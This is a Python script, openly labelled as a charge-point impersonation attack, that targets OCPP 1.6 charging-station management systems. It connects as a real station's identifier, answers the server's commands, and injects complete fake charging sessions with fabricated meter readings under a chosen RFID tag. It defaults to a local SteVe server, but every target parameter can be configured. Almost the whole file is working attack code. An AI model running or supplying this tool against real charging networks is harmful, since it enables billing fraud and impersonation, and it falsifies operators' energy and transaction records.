"""
CP Impersonation Attack

Connects to a CSMS using a legitimate charge-point identifier (impersonating a real CP)
and sends a complete fake charging session (BootNotification, StartTransaction,
fabricated MeterValues, StopTransaction) to make the CSMS record a malicious recharge.

Env vars:
  CSMS_URL      WebSocket base URL (default: ws://localhost:8180/steve/websocket/CentralSystemService)
  CP_ID         Charge-point identifier to impersonate (default: VICTIM_CP)
  ID_TAG        RFID tag / idTag to use for the fake transaction (default: FAKE_ID_42)
  METER_START   Starting meter value in Wh (default: 12000)
  METER_END     Ending meter value in Wh (default: 24500)
  NUM_CYCLES    How many fake sessions to run (default: 1)
  INTERVAL_S    Seconds between MeterValues during a fake session (default: 3)
"""

import asyncio
import logging
import os
import random

import websockets
from ocpp.routing import on
from ocpp.v16 import ChargePoint as CPBase, call, call_result
from ocpp.v16.enums import (
    RegistrationStatus,
    ChargePointStatus,
    ChargePointErrorCode,
    Reason,
    AvailabilityStatus,
    ConfigurationStatus,
    RemoteStartStopStatus,
    ResetStatus,
    UnlockStatus,
    ClearCacheStatus,
    DataTransferStatus,
)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
)
logger = logging.getLogger("cp_impersonation")

CSMS_URL = os.getenv("CSMS_URL", "ws://localhost:8180/steve/websocket/CentralSystemService")
CP_ID = os.getenv("CP_ID", "VICTIM_CP")
ID_TAG = os.getenv("ID_TAG", "USER001")
METER_START = int(os.getenv("METER_START", "12000"))
METER_END = int(os.getenv("METER_END", "24500"))
NUM_CYCLES = int(os.getenv("NUM_CYCLES", "1"))
INTERVAL_S = float(os.getenv("INTERVAL_S", "3"))


class FakeCP(CPBase):
    def __init__(self, cp_id: str, connection):
        super().__init__(cp_id, connection)
        self.cp_id = cp_id
        self.transaction_id = None

    # ------------------------------------------------------------------
    # Handlers for CSMS-initiated calls (prevents NotImplemented errors)
    # ------------------------------------------------------------------
    @on("GetConfiguration")
    async def on_get_configuration(self, key=None, **kwargs):
        logger.info("[%s] CSMS requested GetConfiguration", self.cp_id)
        return call_result.GetConfiguration(configuration_key=[], unknown_key=[])

    @on("ChangeConfiguration")
    async def on_change_configuration(self, key, value, **kwargs):
        logger.info("[%s] CSMS requested ChangeConfiguration: %s = %s", self.cp_id, key, value)
        return call_result.ChangeConfiguration(status=ConfigurationStatus.accepted)

    @on("ChangeAvailability")
    async def on_change_availability(self, connector_id, type, **kwargs):
        logger.info("[%s] CSMS requested ChangeAvailability connector=%s type=%s", self.cp_id, connector_id, type)
        return call_result.ChangeAvailability(status=AvailabilityStatus.accepted)

    @on("RemoteStartTransaction")
    async def on_remote_start_transaction(self, id_tag, connector_id=None, **kwargs):
        logger.warning("[%s] CSMS requested RemoteStartTransaction id_tag=%s", self.cp_id, id_tag)
        return call_result.RemoteStartTransaction(status=RemoteStartStopStatus.accepted)

    @on("RemoteStopTransaction")
    async def on_remote_stop_transaction(self, transaction_id, **kwargs):
        logger.warning("[%s] CSMS requested RemoteStopTransaction tx_id=%s", self.cp_id, transaction_id)
        return call_result.RemoteStopTransaction(status=RemoteStartStopStatus.accepted)

    @on("Reset")
    async def on_reset(self, type, **kwargs):
        logger.warning("[%s] CSMS requested Reset type=%s", self.cp_id, type)
        return call_result.Reset(status=ResetStatus.accepted)

    @on("UnlockConnector")
    async def on_unlock_connector(self, connector_id, **kwargs):
        logger.info("[%s] CSMS requested UnlockConnector connector=%s", self.cp_id, connector_id)
        return call_result.UnlockConnector(status=UnlockStatus.unlocked)

    @on("ClearCache")
    async def on_clear_cache(self, **kwargs):
        logger.info("[%s] CSMS requested ClearCache", self.cp_id)
        return call_result.ClearCache(status=ClearCacheStatus.accepted)

    @on("DataTransfer")
    async def on_data_transfer(self, vendor_id, message_id=None, data=None, **kwargs):
        logger.info("[%s] CSMS requested DataTransfer vendor=%s", self.cp_id, vendor_id)
        return call_result.DataTransfer(status=DataTransferStatus.accepted)


    async def impersonate_and_fake_charge(self):
        """Full impersonation + fake recharge flow."""
        # 1. BootNotification — gain trust
        resp = await self.call(call.BootNotification(
            charge_point_model="Wallbox XYZ",
            charge_point_vendor="anewone",
        ))
        if resp.status != RegistrationStatus.accepted:
            logger.error("[%s] BootNotification rejected: %s", self.cp_id, resp.status)
            return

        logger.warning("[%s] IMPERSONATION SUCCESS — CSMS accepted fake identity", self.cp_id)

        # 2. StatusNotification: Available
        await self._status(ChargePointStatus.available, "Connector 1 available")

        for cycle in range(1, NUM_CYCLES + 1):
            logger.warning("[%s] Starting FAKE recharge cycle %d/%d", self.cp_id, cycle, NUM_CYCLES)
            await self._run_fake_session()
            await asyncio.sleep(2)

        logger.warning("[%s] Attack complete — %d fake session(s) injected into CSMS", self.cp_id, NUM_CYCLES)

    async def _run_fake_session(self):
        """Simulate one fake charging session with fabricated meter data."""
        # 3. StatusNotification: Preparing
        await self._status(ChargePointStatus.preparing, "Connector 1 preparing")
        await asyncio.sleep(1)

        # 4. StartTransaction
        start_resp = await self.call(call.StartTransaction(
            connector_id=1,
            id_tag=ID_TAG,
            meter_start=METER_START,
            timestamp=self._now(),
        ))

        if not hasattr(start_resp, "transaction_id"):
            logger.error("[%s] StartTransaction failed or rejected", self.cp_id)
            return

        self.transaction_id = start_resp.transaction_id
        logger.warning(
            "[%s] FAKE StartTransaction accepted | tx_id=%s | id_tag=%s | meter_start=%s",
            self.cp_id, self.transaction_id, ID_TAG, METER_START,
        )

        # 5. StatusNotification: Charging
        await self._status(ChargePointStatus.charging, "Connector 1 charging")

        # 6. Fabricated MeterValues
        current_meter = METER_START
        step = max(1, (METER_END - METER_START) // 5)
        while current_meter < METER_END:
            current_meter = min(current_meter + step, METER_END)
            await self._meter_value(current_meter)
            await asyncio.sleep(INTERVAL_S)

        # 7. StopTransaction
        stop_resp = await self.call(call.StopTransaction(
            meter_stop=current_meter,
            timestamp=self._now(),
            transaction_id=self.transaction_id,
            reason=Reason.local,
            id_tag=ID_TAG,
        ))
        logger.warning(
            "[%s] FAKE StopTransaction sent | tx_id=%s | meter_stop=%s",
            self.cp_id, self.transaction_id, current_meter,
        )

        # 8. StatusNotification: Available
        await self._status(ChargePointStatus.available, "Connector 1 available")

    async def _status(self, status: ChargePointStatus, info: str):
        """Send a StatusNotification."""
        try:
            await self.call(call.StatusNotification(
                connector_id=1,
                error_code=ChargePointErrorCode.noError,
                status=status,
                timestamp=self._now(),
                info=info,
            ))
            logger.info("[%s] StatusNotification → %s", self.cp_id, status)
        except Exception as exc:
            logger.error("[%s] StatusNotification error: %s", self.cp_id, exc)

    async def _meter_value(self, value_wh: int):
        """Send a fabricated MeterValues frame."""
        try:
            await self.call(call.MeterValues(
                connector_id=1,
                transaction_id=self.transaction_id,
                meter_value=[{
                    "timestamp": self._now(),
                    "sampledValue": [
                        {
                            "value": str(value_wh),
                            "unit": "Wh",
                            "measurand": "Energy.Active.Import.Register",
                        }
                    ],
                }],
            ))
            logger.info("[%s] MeterValues → %s Wh (FAKE)", self.cp_id, value_wh)
        except Exception as exc:
            logger.error("[%s] MeterValues error: %s", self.cp_id, exc)

    @staticmethod
    def _now() -> str:
        from datetime import datetime, timezone
        return datetime.now(timezone.utc).isoformat()


async def _worker():
    ws_url = f"{CSMS_URL}/{CP_ID}"
    logger.info("Starting CP Impersonation attack")
    logger.info("Target CSMS: %s", ws_url)
    logger.info("Impersonating CP_ID: %s  |  Fake idTag: %s", CP_ID, ID_TAG)

    try:
        async with websockets.connect(ws_url, subprotocols=["ocpp1.6"]) as ws:
            cp = FakeCP(CP_ID, ws)
            await asyncio.gather(cp.start(), cp.impersonate_and_fake_charge())
    except Exception as exc:
        logger.error("[%s] Connection error: %s", CP_ID, exc)


if __name__ == "__main__":
    try:
        asyncio.run(_worker())
    except KeyboardInterrupt:
        logger.info("Stopped by user")
